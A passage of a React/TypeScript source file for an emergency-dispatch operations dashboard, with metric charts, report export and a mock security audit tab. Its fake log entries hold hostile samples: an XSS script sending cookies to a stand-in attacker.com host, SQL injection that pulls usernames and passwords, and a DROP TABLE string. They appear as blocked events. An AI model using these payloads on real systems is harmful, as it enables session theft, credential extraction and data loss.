/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useMemo, useEffect } from 'react';
import {
  ResponsiveContainer,
  AreaChart,
  Area,
  BarChart,
  Bar,
  LineChart,
  Line,
  XAxis,
  YAxis,
  CartesianGrid,
  Tooltip,
  Legend,
  PieChart,
  Pie,
  Cell,
  RadarChart,
  PolarGrid,
  PolarAngleAxis,
  PolarRadiusAxis,
  Radar
} from 'recharts';
import {
  Activity,
  Shield,
  Clock,
  TrendingUp,
  Percent,
  Truck,
  Heart,
  FileText,
  AlertTriangle,
  Play,
  RotateCcw,
  Sparkles,
  Layers,
  Flame,
  CheckCircle2,
  Users,
  ShieldAlert,
  AlertOctagon,
  Terminal,
  Lock,
  Unlock,
  Globe,
  UserX,
  Filter,
  Trash2,
  Search,
  Download
} from 'lucide-react';
import { motion } from 'motion/react';
import {
  CoverageSector,
  FleetUnit,
  EmergencyReport,
  DrillSession,
  UserPerformance,
  EmergencyType
} from '../types';

export interface SecurityLog {
  id: string;
  timestamp: string;
  ip: string;
  event: string;
  target: string;
  user: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  status: 'blocked' | 'banned' | 'logged' | 'quarantined' | 'alerted';
  payload: string;
  geo?: string;
}

interface GlobalOperationsDashboardProps {
  sectors: CoverageSector[];
  units: FleetUnit[];
  reports: EmergencyReport[];
  drillSectors: CoverageSector[];
  drillUnits: FleetUnit[];
  drillReports: EmergencyReport[];
  drillSession: DrillSession | null;
  drillPerformance: UserPerformance | null;
  lang: 'es' | 'en';
  currentRegion?: { lat: number; lon: number; regionName: string };
}

export default function GlobalOperationsDashboard({
  sectors,
  units,
  reports,
  drillSectors,
  drillUnits,
  drillReports,
  drillSession,
  drillPerformance,
  lang,
  currentRegion
}: GlobalOperationsDashboardProps) {
  // Option to switch the dashboard view between real-world operational and sandbox drill data
  const [dataSource, setDataSource] = useState<'real' | 'drill'>('real');
  // Dynamic temporal simulations to simulate real-time operations charting
  const [timeSeriesInterval, setTimeSeriesInterval] = useState<number>(0);

  // Security Audit & intelligence states
  const [dashboardTab, setDashboardTab] = useState<'metrics' | 'security'>('metrics');
  const [securityLogs, setSecurityLogs] = useState<SecurityLog[]>([
    {
      id: 'sec-1',
      timestamp: '2026-07-02 11:15:24',
      ip: '185.220.101.5',
      event: 'BRUTE_FORCE_LOGIN',
      target: '/api/auth/login',
      user: 'admin_soae',
      severity: 'critical',
      status: 'banned',
      geo: 'Frankfurt, DE (Tor Node)',
      payload: JSON.stringify({
        pass_length: 12,
        attempts_last_5m: 84,
        origin: 'Tor network exit node',
        user_agent: 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0',
        signature: '0x8F9C3E1B',
        headers: {
          'Accept': 'application/json',
          'X-Forwarded-For': '185.220.101.5',
          'CF-Connecting-IP': '185.220.101.5'
        }
      }, null, 2)
    },
    {
      id: 'sec-2',
      timestamp: '2026-07-02 11:08:12',
      ip: '109.244.15.198',
      event: 'SQL_INJECTION_SCAN',
      target: '/api/system/region',
      user: 'anonymous',
      severity: 'high',
      status: 'blocked',
      geo: 'Moscow, RU',
      payload: JSON.stringify({
        injection_detected: "UNION SELECT username, password FROM users --",
        method: 'POST',
        parameters: { region: 'metropolitan' },
        user_agent: 'sqlmap/1.7.5#stable (https://sqlmap.org)',
        signature: '0xA4F23D77',
        headers: {
          'User-Agent': 'sqlmap/1.7.5#stable',
          'Content-Type': 'application/json'
        }
      }, null, 2)
    },
    {
      id: 'sec-3',
      timestamp: '2026-07-02 10:45:01',
      ip: '198.51.100.42',
      event: 'UNAUTHORIZED_WS_TAP',
      target: '/ws',
      user: 'terminal_copilot_9',
      severity: 'medium',
      status: 'quarantined',
      geo: 'Dallas, US (Cell tower)',
      payload: JSON.stringify({
        websocket_handshake: 'failed',
        token_supplied: 'expired_jwt_sig_error',
        requested_channels: ['fleet_telemetry', 'crisis_drills'],
        signature: '0xE493C2A9',
        headers: {
          'Upgrade': 'websocket',
          'Connection': 'Upgrade',
          'Sec-WebSocket-Version': '13'
        }
      }, null, 2)
    },
    {
      id: 'sec-4',
      timestamp: '2026-07-02 10:22:30',
      ip: '45.122.3.99',
      event: 'XSS_PAYLOAD_DETECTION',
      target: '/api/emergency/report',
      user: 'citizen_web_client',
      severity: 'high',
      status: 'blocked',
      geo: 'Hanoi, VN',
      payload: JSON.stringify({
        sanitized_fields: {
          description: '<script>fetch("http://attacker.com/steal?cookie="+document.cookie)</script>'
        },
        client_ip: '45.122.3.99',
        signature: '0xB839C211'
      }, null, 2)
    },
    {
      id: 'sec-5',
      timestamp: '2026-07-02 09:54:15',
      ip: '192.168.1.104',
      event: 'REPLAY_ATTACK_ATTEMPT',
      target: '/api/optimization/match',
      user: 'dispatch_operator_2',
      severity: 'medium',
      status: 'logged',
      geo: 'Intranet Sector 4',
      payload: JSON.stringify({
        sequence_counter: 10422,
        server_sequence_counter: 10425,
        out_of_sync_ms: 185000,
        note: 'Timestamp sequence out of acceptable latency bounds.',
        signature: '0xC993D1E0'
      }, null, 2)
    }
  ]);
  const [selectedLogId, setSelectedLogId] = useState<string | null>('sec-1');
  const [searchQuery, setSearchQuery] = useState<string>('');
  const [severityFilter, setSeverityFilter] = useState<'all' | 'low' | 'medium' | 'high' | 'critical'>('all');
  const [eventFilter, setEventFilter] = useState<'all' | 'login' | 'scan' | 'ws' | 'injection'>('all');
  const [banlist, setBanlist] = useState<string[]>(['185.220.101.5', '198.51.100.12']);
  const [newBanIp, setNewBanIp] = useState<string>('');
  const [isSimulatingAttack, setIsSimulatingAttack] = useState<boolean>(false);

  // Auto-switch data source if a training drill session is active
  useEffect(() => {
    if (drillSession?.isActive) {
      setDataSource('drill');
    }
  }, [drillSession?.isActive]);

  // Periodic interval tick to generate slightly moving simulated historical trend lines
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeSeriesInterval(prev => (prev + 1) % 100);
    }, 5000);
    return () => clearInterval(timer);
  }, []);

  // Cyber security log filtering, simulation and management handlers
  const filteredLogs = useMemo(() => {
    return securityLogs.filter(log => {
      const query = searchQuery.toLowerCase();
      const matchesSearch = 
        log.ip.toLowerCase().includes(query) ||
        log.event.toLowerCase().includes(query) ||
        log.target.toLowerCase().includes(query) ||
        log.user.toLowerCase().includes(query) ||
        (log.geo && log.geo.toLowerCase().includes(query));
      
      const matchesSeverity = severityFilter === 'all' || log.severity === severityFilter;
      
      let matchesEvent = true;
      if (eventFilter !== 'all') {
        const ev = eventFilter.toLowerCase();
        if (ev === 'login') {
          matchesEvent = log.event.toLowerCase().includes('login') || log.event.toLowerCase().includes('mfa');
        } else if (ev === 'scan') {
          matchesEvent = log.event.toLowerCase().includes('scan');
        } else if (ev === 'injection') {
          matchesEvent = log.event.toLowerCase().includes('injection') || log.event.toLowerCase().includes('xss');
        } else if (ev === 'ws') {
          matchesEvent = log.event.toLowerCase().includes('ws');
        }
      }
      
      return matchesSearch && matchesSeverity && matchesEvent;
    });
  }, [securityLogs, searchQuery, severityFilter, eventFilter]);

  const triggerIntrusionSimulation = () => {
    setIsSimulatingAttack(true);
    
    setTimeout(() => {
      setIsSimulatingAttack(false);
      
      const attacks = [
        {
          event: 'BRUTE_FORCE_MFA',
          target: '/api/auth/mfa-verify',
          user: 'operator_alpha',
          severity: 'critical' as const,
          status: 'blocked' as const,
          geo: 'Shenzhen, CN',
          payload: {
            mfa_attempts: 12,
            target_account: 'operator_alpha_soae',
            token_attempts: ['582104', '492810', '192049'],
            user_agent: 'Python-urllib/3.10',
            headers: {
              'X-Forwarded-For': '112.95.12.87',
              'Connection': 'keep-alive'
            }
          }
        },
        {
          event: 'WAF_SQL_INJECTION',
          target: '/api/citizen/submit',
          user: 'anonymous_citizen',
          severity: 'high' as const,
          status: 'blocked' as const,
          geo: 'Amsterdam, NL',
          payload: {
            parameters: {
              report_id: "102' OR '1'='1",
              text: "'; DROP TABLE emergency_reports; --"
            },
            signatures_tripped: ['WAF_SQLi_RULE_4102', 'OWASP_TOP_10_INJECTION'],
            user_agent: 'Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)'
          }
        },
        {
          event: 'DDOS_HTTP_FLOOD',
          target: '/api/optimization/match',
          user: 'anonymous',
          severity: 'medium' as const,
          status: 'logged' as const,
          geo: 'Botnet Cluster (Geo-distributed)',
          payload: {
            requests_per_second: 1420,
            concurrency: 500,
            protocol: 'HTTP/2',
            note: 'Rate limiting triggered on routing endpoint. Throttled source subnets.',
            headers: {
              'Accept-Encoding': 'gzip, deflate, br'
            }
          }
        },
        {
          event: 'API_HIJACK_ATTEMPT',
          target: '/api/system/region',
          user: 'rogue_copilot_unit_15',
          severity: 'critical' as const,
          status: 'quarantined' as const,
          geo: 'Bogota, CO (Cellular Gateway)',
          payload: {
            forged_jwt_header: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
            cryptographic_validation: 'failed',
            attempted_action: 'WRITE_SECTOR_RISK_BOUNDS',
            signature: '0xFA8891CC'
          }
        },
        {
          event: 'EXPIRED_JWT_ACCESS',
          target: '/api/fleet/telemetry',
          user: 'copilot_tablet_3',
          severity: 'low' as const,
          status: 'logged' as const,
          geo: 'Intranet Sector 2',
          payload: {
            auth_header: 'Bearer eyJhbGciOiJIUzI1Ni...',
            token_expired_at: '2026-07-01 23:59:59',
            current_time: '2026-07-02 11:30:18',
            signature: '0xD438E221'
          }
        }
      ];
      
      const randomAttack = attacks[Math.floor(Math.random() * attacks.length)];
      const randomIp = `${Math.floor(Math.random() * 223) + 1}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 254) + 1}`;
      const now = new Date();
      const timestampStr = `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')} ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')}`;
      
      const newLog: SecurityLog = {
        id: `sec-sim-${Date.now()}`,
        timestamp: timestampStr,
        ip: randomIp,
        event: randomAttack.event,
        target: randomAttack.target,
        user: randomAttack.user,
        severity: randomAttack.severity,
        status: randomAttack.status,
        geo: randomAttack.geo,
        payload: JSON.stringify(randomAttack.payload, null, 2)
      };
      
      setSecurityLogs(prev => [newLog, ...prev]);
      setSelectedLogId(newLog.id);
    }, 1500);
  };

  const handleToggleBanIp = (ip: string) => {
    if (banlist.includes(ip)) {
      setBanlist(prev => prev.filter(item => item !== ip));
      setSecurityLogs(prev => prev.map(log => {
        if (log.ip === ip) {
          return { ...log, status: 'logged' };
        }
        return log;
      }));
    } else {
      setBanlist(prev => [...prev, ip]);
      setSecurityLogs(prev => prev.map(log => {
        if (log.ip === ip) {
          return { ...log, status: 'banned' };
        }
        return log;
      }));
    }
  };

  const handleManualBanIp = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newBanIp.trim()) return;
    
    const ip = newBanIp.trim();
    if (!banlist.includes(ip)) {
      setBanlist(prev => [...prev, ip]);
      
      const now = new Date();
      const timestampStr = `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')} ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')}`;
      
      const newLog: SecurityLog = {
        id: `sec-manual-ban-${Date.now()}`,
        timestamp: timestampStr,
        ip: ip,
        event: 'MANUAL_FIREWALL_IP_BAN',
        target: 'FW_BANLIST_CONTROL',
        user: 'dispatch_admin',
        severity: 'high',
        status: 'banned',
        geo: 'Manual Action',
        payload: JSON.stringify({
          action: 'MANUAL_IP_BAN',
          operator: 'SOAE Dispatch Command Admin',
          target_ip: ip,
          firewall_rule: 'STATIC_IP_DENY_RULE_94',
          timestamp: timestampStr
        }, null, 2)
      };
      
      setSecurityLogs(prev => [newLog, ...prev]);
      setSelectedLogId(newLog.id);
    }
    setNewBanIp('');
  };

  const handleDownloadSecurityLogs = () => {
    const header = `===================================================================
SOAE CYBER SECURITY AUDIT LOGS - DISPATCH COMMAND SOC
GENERATED: ${new Date().toISOString()}
===================================================================\n\n`;
    const logsText = securityLogs.map(log => {
      return `[${log.timestamp}] [${log.severity.toUpperCase()}] EVENT: ${log.event}
IP: ${log.ip} (${log.geo || 'Unknown'})
Target Endpoint: ${log.target} | User: ${log.user}
Defense Action Status: ${log.status.toUpperCase()}
Payload Details:
${log.payload}
-------------------------------------------------------------------`;
    }).join('\n\n');

    const blob = new Blob([header + logsText], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.setAttribute('download', `soae_security_audit_logs_${Date.now()}.txt`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  // Set dataset based on current filter selection
  const activeSectors = useMemo(() => {
    return dataSource === 'drill' ? drillSectors : sectors;
  }, [dataSource, sectors, drillSectors]);

  const activeUnits = useMemo(() => {
    return dataSource === 'drill' ? drillUnits : units;
  }, [dataSource, units, drillUnits]);

  const activeReports = useMemo(() => {
    return dataSource === 'drill' ? drillReports : reports;
  }, [dataSource, reports, drillReports]);

  // Translate emergency types to human readable strings
  const getEmergencyLabel = (type: EmergencyType): string => {
    if (lang === 'es') {
      switch (type) {
        case 'fire': return 'Fuego / Incendio';
        case 'landslide': return 'Derrumbe / Deslave';
        case 'medical': return 'Urgencia Médica';
        case 'chemical': return 'Derrame Químico';
        default: return type;
      }
    } else {
      switch (type) {
        case 'fire': return 'Fire / Wildfire';
        case 'landslide': return 'Landslide / Collapse';
        case 'medical': return 'Medical Emergency';
        case 'chemical': return 'Chemical Hazard';
        default: return type;
      }
    }
  };

  // KPI Calculations
  const metrics = useMemo(() => {
    const totalSectors = activeSectors.length || 1;
    
    // Average IVR across sectors
    const avgIvr = activeSectors.reduce((acc, s) => acc + s.ivr, 0) / totalSectors;
    const baseRiskAvg = activeSectors.reduce((acc, s) => acc + s.baseRisk, 0) / totalSectors;
    
    // Units counters
    const totalUnits = activeUnits.length;
    const dispatchedUnitsCount = activeUnits.filter(u => u.status === 'dispatched').length;
    const availableUnitsCount = activeUnits.filter(u => u.status === 'available').length;
    const offlineUnitsCount = activeUnits.filter(u => u.status === 'offline').length;
    
    // Fleet readiness rate
    const fleetReadiness = totalUnits > 0 ? (availableUnitsCount / totalUnits) * 100 : 0;
    
    // Incident reports counters
    const totalIncidents = activeReports.length;
    const pendingIncidents = activeReports.filter(r => r.status === 'pending').length;
    const activeDispatchedIncidents = activeReports.filter(r => r.status === 'dispatched').length;
    const resolvedIncidents = activeReports.filter(r => r.status === 'resolved').length;

    // Running response time (simulated or actual user performance in drill session)
    let avgResponseTimeSec = 210; // default baseline (3.5 mins)
    if (dataSource === 'drill' && drillPerformance) {
      avgResponseTimeSec = drillPerformance.averageResponseTimeSec;
    } else {
      // Create a dynamic responsive metric using real reports & assigned units
      const dispatchCount = activeDispatchedIncidents + resolvedIncidents;
      if (dispatchCount > 0) {
        // Shorter response if more units are active, showing optimized behavior
        avgResponseTimeSec = Math.max(90, 240 - dispatchCount * 12);
      }
      // Add slight micro jitter based on interval
      avgResponseTimeSec += (timeSeriesInterval % 5) * 4 - 8;
    }

    return {
      avgIvr,
      baseRiskAvg,
      totalUnits,
      dispatchedUnitsCount,
      availableUnitsCount,
      offlineUnitsCount,
      fleetReadiness,
      totalIncidents,
      pendingIncidents,
      activeDispatchedIncidents,
      resolvedIncidents,
      avgResponseTimeSec
    };
  }, [activeSectors, activeUnits, activeReports, dataSource, drillPerformance, timeSeriesInterval]);

  // Sector-by-Sector Risk Analysis & Residual Vulnerability (IVR vs Base Risk)
  const sectorChartData = useMemo(() => {
    return activeSectors.map(s => ({
      name: s.name,
      [lang === 'es' ? 'Riesgo Base' : 'Base Risk']: parseFloat((s.baseRisk * 100).toFixed(1)),
      [lang === 'es' ? 'Riesgo Residual (IVR)' : 'Residual Vulnerability (IVR)']: parseFloat((s.ivr * 100).toFixed(1)),
      [lang === 'es' ? 'Población affected' : 'Population density (x10)']: parseFloat((s.populationDensity / 100).toFixed(1)),
    }));
  }, [activeSectors, lang]);

  // Simulated Historical Risk Trend over past 6 hours (with actual live IVR integrated as the current hour)
  const historicalTrendData = useMemo(() => {
    const hours = lang === 'es' 
      ? ['Hace 5h', 'Hace 4h', 'Hace 3h', 'Hace 2h', 'Hace 1h', 'Actual']
      : ['5h ago', '4h ago', '3h ago', '2h ago', '1h ago', 'Current'];

    // Generate trend coordinates that baseline around the average IVR
    const baseIvr = metrics.avgIvr * 100;
    const jitterFactor = [
      dataSource === 'drill' ? 8 : -3,
      dataSource === 'drill' ? 12 : 5,
      dataSource === 'drill' ? 4 : -1,
      dataSource === 'drill' ? -5 : -4,
      dataSource === 'drill' ? -2 : 2,
      0 // Last point is the current calculated live IVR
    ];

    return hours.map((h, idx) => {
      const computedVal = Math.max(5, Math.min(95, baseIvr + jitterFactor[idx] + (timeSeriesInterval % 3) - 1.5));
      return {
        time: h,
        [lang === 'es' ? 'Riesgo Cobertura' : 'Residual Vulnerability %']: parseFloat(computedVal.toFixed(1)),
        [lang === 'es' ? 'Objetivo de Seguridad' : 'Target Safety Threshold']: 35.0,
      };
    });
  }, [metrics.avgIvr, lang, dataSource, timeSeriesInterval]);

  // Incident types distribution dataset
  const incidentDistributionData = useMemo(() => {
    const counts = { fire: 0, landslide: 0, medical: 0, chemical: 0 };
    activeReports.forEach(r => {
      if (r.type in counts) counts[r.type]++;
    });

    const isZero = Object.values(counts).every(c => c === 0);
    if (isZero) {
      // Beautiful fallback default data for visual dashboard completion
      return [
        { name: getEmergencyLabel('fire'), value: 4, color: '#FF4444' },
        { name: getEmergencyLabel('landslide'), value: 2, color: '#FFA500' },
        { name: getEmergencyLabel('medical'), value: 5, color: '#00e5ff' },
        { name: getEmergencyLabel('chemical'), value: 1, color: '#b624ff' }
      ];
    }

    return [
      { name: getEmergencyLabel('fire'), value: counts.fire, color: '#FF4444' },
      { name: getEmergencyLabel('landslide'), value: counts.landslide, color: '#FFA500' },
      { name: getEmergencyLabel('medical'), value: counts.medical, color: '#00e5ff' },
      { name: getEmergencyLabel('chemical'), value: counts.chemical, color: '#b624ff' }
    ].filter(item => item.value > 0);
  }, [activeReports, lang]);

  // Unit Status distribution dataset
  const unitStatusData = useMemo(() => {
    return [
      { 
        name: lang === 'es' ? 'Disponible' : 'Available', 
        value: metrics.availableUnitsCount, 
        color: '#00FF41' 
      },
      { 
        name: lang === 'es' ? 'Desplegado' : 'Dispatched', 
        value: metrics.dispatchedUnitsCount, 
        color: '#00e5ff' 
      },
      { 
        name: lang === 'es' ? 'Fuera de Línea' : 'Offline', 
        value: metrics.offlineUnitsCount, 
        color: '#FF4444' 
      }
    ].filter(item => item.value > 0);
  }, [metrics, lang]);

  // Operations prescriptive advisor based on current risks and fleet dispatch levels
  const tacticalAdvisory = useMemo(() => {
    const advisories: { id: string; type: 'warning' | 'info' | 'success'; textEn: string; textEs: string }[] = [];
    
    // Advisory 1: Response time checks
    if (metrics.avgResponseTimeSec > 200) {
      advisories.push({
        id: 'adv-resp',
        type: 'warning',
        textEn: 'RESPONSE LATENCY WARNING: Fleet routing times exceed nominal 3-minute emergency threshold. Check dispatcher priority queue.',
        textEs: 'AVISO DE LATENCIA DE RESPUESTA: Los tiempos de ruta exceden el umbral de 3 minutos. Revise la cola de despacho prioritario.'
      });
    } else if (metrics.avgResponseTimeSec < 150) {
      advisories.push({
        id: 'adv-resp',
        type: 'success',
        textEn: 'EXCELLENT fleet deployment efficiency. Average response is well within safe margins.',
        textEs: 'EXCELENTE eficiencia de despliegue. El promedio de respuesta está dentro de los límites seguros.'
      });
    }

    // Advisory 2: Sector vulnerability checks
    const highlyVulnerableSectors = activeSectors.filter(s => s.ivr > 0.6);
    if (highlyVulnerableSectors.length > 0) {
      const sectorNames = highlyVulnerableSectors.map(s => s.name).join(', ');
      advisories.push({
        id: 'adv-ivr',
        type: 'danger' as any, // mapping danger to warning icon with specific visual alert styling
        textEn: `CRITICAL AREA EXPOSURE: Dynamic Index of Residual Vulnerability (IVR) exceeds 60% in [${sectorNames}]. Pre-position standby units immediately.`,
        textEs: `EXPOSICIÓN CRÍTICA DE ÁREA: El Índice de Vulnerabilidad Residual (IVR) supera el 60% en [${sectorNames}]. Pre-posicione unidades de inmediato.`
      });
    } else {
      advisories.push({
        id: 'adv-ivr-ok',
        type: 'success',
        textEn: 'All sectors maintain dynamic residual vulnerability ratings (IVR) within safe bounds (<60%).',
        textEs: 'Todos los sectores mantienen índices de vulnerabilidad residual (IVR) estables dentro de límites seguros (<60%).'
      });
    }

    // Advisory 3: Available fleet checks
    if (metrics.fleetReadiness < 30) {
      advisories.push({
        id: 'adv-fleet',
        type: 'warning',
        textEn: 'RESERVE DEFICIT: Less than 30% of emergency vehicles are available. Consider routing support forces from adjoining base sectors.',
        textEs: 'DÉFICIT DE RESERVA: Menos del 30% de vehículos de emergencia disponibles. Considere solicitar refuerzos de sectores colindantes.'
      });
    } else if (metrics.fleetReadiness > 70) {
      advisories.push({
        id: 'adv-fleet-high',
        type: 'success',
        textEn: 'HIGH fleet capability reserves. 70%+ of vehicles are in standby status, ready for tactical routing.',
        textEs: 'ALTA reserva de flota. Más del 70% de vehículos listos para enrutamiento táctico inmediato.'
      });
    }

    return advisories;
  }, [metrics, activeSectors]);

  // Export operational logs report as pure text file
  const handleExportReport = () => {
    const timestamp = new Date().toLocaleString();
    
    // Determine the active operating country based on regionName
    const regionLabel = currentRegion?.regionName || (lang === 'es' ? 'Ubicación Local' : 'Local Location');
    let countryName = 'México'; // Default fallback
    const normalizedRegion = regionLabel.toLowerCase();
    if (normalizedRegion.includes('mx') || normalizedRegion.includes('méxico') || normalizedRegion.includes('mex')) {
      countryName = lang === 'es' ? 'México' : 'Mexico';
    } else if (normalizedRegion.includes('vzla') || normalizedRegion.includes('venezuela') || normalizedRegion.includes('caracas')) {
      countryName = 'Venezuela';
    } else if (normalizedRegion.includes('col') || normalizedRegion.includes('colombia') || normalizedRegion.includes('bogotá') || normalizedRegion.includes('bogota')) {
      countryName = 'Colombia';
    } else if (normalizedRegion.includes('esp') || normalizedRegion.includes('españa') || normalizedRegion.includes('espana') || normalizedRegion.includes('madrid')) {
      countryName = lang === 'es' ? 'España' : 'Spain';
    }

    const reportText = `===================================================================
SOAE TACTICAL OPERATIONS REPORT - ${dataSource === 'drill' ? 'TRAINING SANDBOX' : 'REAL-TIME LIVE'}
REPORT GENERATED: ${timestamp}
SYSTEM LANGUAGE: ${lang.toUpperCase()}
===================================================================

[0] MISSION COMMAND CENTER & GEOGRAPHIC JURISDICTION
-------------------------------------------------------------------
- CENTRAL STATION: Centro de Operaciones de Emergencia (COE - Central)
- GEOGRAPHIC COORDINATES: Lat ${currentRegion?.lat ?? 19.4326}°N, Lon ${currentRegion?.lon ?? -99.1332}°E
- OPERATIONAL REGION: ${regionLabel}
- COUNTRY OF OPERATIONS: ${countryName}

[1] KEY PERFORMANCE INDICATORS
-------------------------------------------------------------------
- Average Response Time: ${Math.floor(metrics.avgResponseTimeSec / 60)}m ${Math.floor(metrics.avgResponseTimeSec % 60)}s
- Fleet Readiness Rate: ${metrics.fleetReadiness.toFixed(1)}%
- Total Dispatchable Units: ${metrics.totalUnits}
  * Active/Dispatched: ${metrics.dispatchedUnitsCount}
  * Standby/Available: ${metrics.availableUnitsCount}
  * Offline/Maintenance: ${metrics.offlineUnitsCount}
- Active System Incidents: ${metrics.pendingIncidents + metrics.activeDispatchedIncidents}
  * Pending Dispatch: ${metrics.pendingIncidents}
  * Dispatched/En-Route: ${metrics.activeDispatchedIncidents}
  * Safely Resolved: ${metrics.resolvedIncidents}

[2] SECTOR RESIDUAL VULNERABILITY (IVR) MATRIX
-------------------------------------------------------------------
${activeSectors.map(s => `* SECTOR: ${s.name} | Base Risk: ${(s.baseRisk * 100).toFixed(0)}% | Dynamic IVR: ${(s.ivr * 100).toFixed(0)}% | Pop Density: ${s.populationDensity} pp/km2`).join('\n')}

[3] SYSTEM ADVISORIES & TACTICAL PRESCRIPTIONS
-------------------------------------------------------------------
${tacticalAdvisory.map((adv, idx) => `${idx + 1}. [${adv.type.toUpperCase()}] ${lang === 'es' ? adv.textEs : adv.textEn}`).join('\n')}

===================================================================
END OF REPORT | SOAE SECTOR LOGISTICS COORDINATOR
===================================================================`;

    const blob = new Blob([reportText], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.setAttribute('download', `soae_operations_report_${dataSource}_${Date.now()}.txt`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  return (
    <div className="w-full h-full bg-[#020202] text-[#00FF41] flex flex-col overflow-y-auto font-mono p-4 gap-4" id="global-operations-dashboard">
      
      {/* HEADER BAR AND FILTERS */}
      <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-3 border border-[#00FF41]/30 bg-[#0a0a0a]/90 p-4 shadow-[0_0_15px_rgba(0,255,65,0.05)]">
        <div>
          <div className="flex items-center gap-2">
            <Activity className="w-5 h-5 text-[#00FF41] animate-pulse" />
            <h1 className="text-sm font-bold tracking-widest uppercase text-white">
              {lang === 'es' ? 'PANEL DE OPERACIONES GLOBALES' : 'GLOBAL OPERATIONS DASHBOARD'}
            </h1>
          </div>
          <p className="text-xxs text-[#00FF41]/60 mt-1 uppercase">
            {lang === 'es' 
              ? 'Consola centralizada de optimización de recursos, logística táctica e indicadores de respuesta'
              : 'Centralized resource optimization console, tactical logistics, and response indicators'}
          </p>
        </div>

        {/* Action Toggles */}
        <div className="flex flex-wrap items-center gap-2">
          <div className="flex border border-[#00FF41]/30 p-0.5 bg-black">
            <button
              onClick={() => setDataSource('real')}
              className={`px-3 py-1 text-xxs font-bold uppercase transition-all cursor-pointer ${
                dataSource === 'real'
                  ? 'bg-[#00FF41] text-black font-extrabold'
                  : 'text-[#00FF41]/60 hover:text-white'
              }`}
            >
              {lang === 'es' ? 'RED REAL' : 'LIVE NETWORK'}
            </button>
            <button
              onClick={() => setDataSource('drill')}
              className={`px-3 py-1 text-xxs font-bold uppercase transition-all cursor-pointer ${
                dataSource === 'drill'
                  ? 'bg-[#FF4444] text-white font-extrabold'
                  : 'text-[#00FF41]/60 hover:text-white'
              }`}
            >
              {lang === 'es' ? 'SANDBOX DE SIMULACIÓN' : 'DRILL SANDBOX'}
            </button>
          </div>

          <button
            onClick={handleExportReport}
            className="flex items-center gap-1.5 px-3 py-1.5 bg-black border border-[#00FF41]/40 hover:border-[#00FF41] text-[#00FF41] hover:bg-[#00FF41]/10 text-xxs font-bold uppercase transition-all cursor-pointer"
          >
            <FileText className="w-3.5 h-3.5" />
            {lang === 'es' ? 'EXPORTAR REPORTE' : 'EXPORT REPORT'}
          </button>
        </div>
      </div>

      {/* DATA SOURCE INDICATOR BAR */}
      <div className={`text-xxs px-3 py-1 border flex items-center justify-between uppercase font-bold transition-all ${
        dataSource === 'drill' 
          ? 'bg-[#FF4444]/10 border-[#FF4444]/30 text-[#FF4444]' 
          : 'bg-[#00FF41]/10 border-[#00FF41]/30 text-[#00FF41]'
      }`}>
        <div className="flex items-center gap-2">
          <span className={`w-2 h-2 rounded-full animate-ping ${dataSource === 'drill' ? 'bg-[#FF4444]' : 'bg-[#00FF41]'}`} />
          <span>
            {dataSource === 'drill' 
              ? (lang === 'es' ? `MODO SIMULACIÓN ACTIVO: ${drillSession?.name || 'DRILL ACTIVE'}` : `SIMULATION DRILL ACTIVE: ${drillSession?.name || 'DRILL ACTIVE'}`)
              : (lang === 'es' ? 'MODO OPERACIONES EN VIVO SECTORIZADO' : 'LIVE SECTORIZED OPERATIONS STATE')}
          </span>
        </div>
        <div>
          {lang === 'es' ? 'FRECUENCIA DE ENLACE: 100% OK' : 'STREAM LINK FEED: 100% SECURE'}
        </div>
      </div>

      {/* VIEW SUB-TAB NAVIGATION */}
      <div className="flex border border-[#00FF41]/20 bg-[#0a0a0a]/70 p-1">
        <button
          onClick={() => setDashboardTab('metrics')}
          className={`flex-1 py-2 text-xxs font-black uppercase tracking-wider text-center cursor-pointer transition-all border ${
            dashboardTab === 'metrics'
              ? 'bg-[#00FF41]/10 border-[#00FF41] text-[#00FF41] font-extrabold shadow-[0_0_10px_rgba(0,255,65,0.15)]'
              : 'border-transparent text-stone-500 hover:text-stone-300'
          }`}
        >
          {lang === 'es' ? '📊 Métricas Operacionales' : '📊 Operational Metrics'}
        </button>
        <button
          onClick={() => setDashboardTab('security')}
          className={`flex-1 py-2 text-xxs font-black uppercase tracking-wider text-center cursor-pointer transition-all border ${
            dashboardTab === 'security'
              ? 'bg-red-500/10 border-red-500 text-red-400 font-extrabold shadow-[0_0_10px_rgba(239,68,68,0.15)]'
              : 'border-transparent text-stone-500 hover:text-stone-300'
          }`}
        >
          {lang === 'es' ? '🛡️ Auditoría de Ciberseguridad (SOC)' : '🛡️ Cyber Security Audit (SOC)'}
        </button>
      </div>

      {dashboardTab === 'metrics' ? (
        <>
          {/* 4 CORE KPI PANEL */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        
        {/* KPI 1: Response Time */}
        <div className="border border-[#00FF41]/20 bg-[#0a0a0a]/75 p-4 flex flex-col justify-between relative overflow-hidden group hover:border-[#00FF41]/50 transition-all">
          <div className="absolute right-3 top-3 opacity-15 text-[#00FF41] group-hover:opacity-30 transition-all">
            <Clock className="w-10 h-10" />
          </div>
          <span className="text-xxs text-[#00FF41]/60 uppercase tracking-widest block font-bold">
